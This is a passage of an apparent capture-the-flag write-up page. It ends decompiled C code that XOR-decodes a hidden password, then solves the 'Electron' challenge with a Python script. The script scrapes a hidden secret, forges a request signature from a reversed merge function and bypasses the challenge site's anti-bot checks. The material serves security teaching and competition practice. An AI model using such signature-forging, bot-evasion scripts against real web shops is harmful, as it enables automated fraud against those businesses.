  res <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)malloc(outLen <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>);
  index <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  <span style=color:#66d9ef>if</span> (outLen <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
    <span style=color:#66d9ef>do</span> {
      uVar3 <span style=color:#f92672>=</span> index <span style=color:#f92672>%</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)((<span style=color:#66d9ef>int</span>)in2len <span style=color:#f92672>-</span> (<span style=color:#66d9ef>int</span>)(input2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>));
      pbVar1 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(res <span style=color:#f92672>+</span> index);
      index <span style=color:#f92672>=</span> index <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
      <span style=color:#f92672>*</span>pbVar1 <span style=color:#f92672>=</span> input2[uVar3] <span style=color:#f92672>^</span> pbVar1[(<span style=color:#66d9ef>int</span>)input1 <span style=color:#f92672>-</span> (<span style=color:#66d9ef>int</span>)res];
    } <span style=color:#66d9ef>while</span> (index <span style=color:#f92672>&lt;</span> outLen);
    res[outLen] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
    <span style=color:#66d9ef>return</span> res;
  }
  <span style=color:#f92672>*</span>res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
  <span style=color:#66d9ef>return</span> res;
}

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> in1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;h</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>FgR</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Tg[VaRUcZ__n^F`GRNx]d</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>]STA_R]Sp]Wz`_^Dj</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>F</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>^DwVVGe[VaRUSZG{</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>[Tt</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>V@&#34;</span>;
    <span style=color:#66d9ef>char</span> in2 [] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x33</span>, <span style=color:#ae81ff>0x33</span>, <span style=color:#ae81ff>0x33</span>, <span style=color:#ae81ff>0x33</span>, <span style=color:#ae81ff>0x37</span>, <span style=color:#ae81ff>0</span>};
    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> pass <span style=color:#f92672>=</span> calcPass(in1, (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>in2);
    printf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pass);
}
</code></pre></div><h1 id=electron>Electron<a href=#electron class=hanchor arialabel=Anchor>&#8983;</a> </h1>
<blockquote>
<p>Shoperfect now has a new bug bounty program to help mitigate bot activity on their website.
You need to buy premium items from Shoperfect, but you need to be fast.</p>
</blockquote>
<p><strong>Description</strong></p>
<p>The challenge required to write a simple bot program to get the flag very quickly.</p>
<p><strong>Solution</strong></p>
<p>With a bit of reverse engineering of the <code>merge</code> function and the rude fingerprinting code, we can write such a script to get the flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> re
<span style=color:#f92672>import</span> requests


<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>merge</span>(in1, in2):
    out <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(in1)):
        out <span style=color:#f92672>+=</span> in1[i] <span style=color:#f92672>+</span> in2[i <span style=color:#f92672>%</span> min(len(in1), len(in2))]

    <span style=color:#66d9ef>return</span> out


resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;https://electron.chal.intentsummit.org/start?id=1&#39;</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
product_id <span style=color:#f92672>=</span> int(re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;/get_limited_item/(\d+)&#39;</span>, resp<span style=color:#f92672>.</span>text)[<span style=color:#ae81ff>0</span>])
<span style=color:#66d9ef>if</span> product_id <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
    product_id <span style=color:#f92672>=</span> product_id <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
<span style=color:#66d9ef>else</span>:
    product_id <span style=color:#f92672>=</span> product_id <span style=color:#f92672>*</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>

print(<span style=color:#e6db74>&#39;PRODUCT&#39;</span>, product_id)

resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;https://electron.chal.intentsummit.org/get_limited_item/</span><span style=color:#e6db74>{</span>product_id<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
<span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Sorry, bot are not allowed on our website&#39;</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text:
    print(<span style=color:#e6db74>&#39;RETRY&#39;</span>)
    exit(<span style=color:#ae81ff>1</span>)

secret <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;&lt;input type=&#34;hidden&#34; value=&#34;(.*?)&#34; style=&#34;visibility: hidden&#34; id=&#34;secret&#34; name=&#34;secret&#34;&gt;&#39;</span>, resp<span style=color:#f92672>.</span>text)[<span style=color:#ae81ff>0</span>]
print(<span style=color:#e6db74>&#39;SECRET&#39;</span>, secret)

sig <span style=color:#f92672>=</span> merge(<span style=color:#e6db74>&#39;343d9040a671c45832ee5381860e2996&#39;</span>, secret)
print(<span style=color:#e6db74>&#39;SIG&#39;</span>, sig)

resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;https://electron.chal.intentsummit.org/send_offer&#39;</span>, data<span style=color:#f92672>=</span>{
    <span style=color:#e6db74>&#39;Do you like spicy potatoes ?&#39;</span>: <span style=color:#e6db74>&#39;yes&#39;</span>,
    <span style=color:#e6db74>&#39;Do you like sausages ?&#39;</span>: <span style=color:#e6db74>&#39;yes&#39;</span>,
    <span style=color:#e6db74>&#39;Are you sure ?&#39;</span>: <span style=color:#e6db74>&#39;yes&#39;</span>,
    <span style=color:#e6db74>&#39;secret&#39;</span>: secret,
    <span style=color:#e6db74>&#39;sig&#39;</span>: sig,
}, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
print(resp<span style=color:#f92672>.</span>status_code, resp<span style=color:#f92672>.</span>text)
</code></pre></div>
</div></div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">
<span>rot13(havce)</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
</div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
</div>
</body>
</html>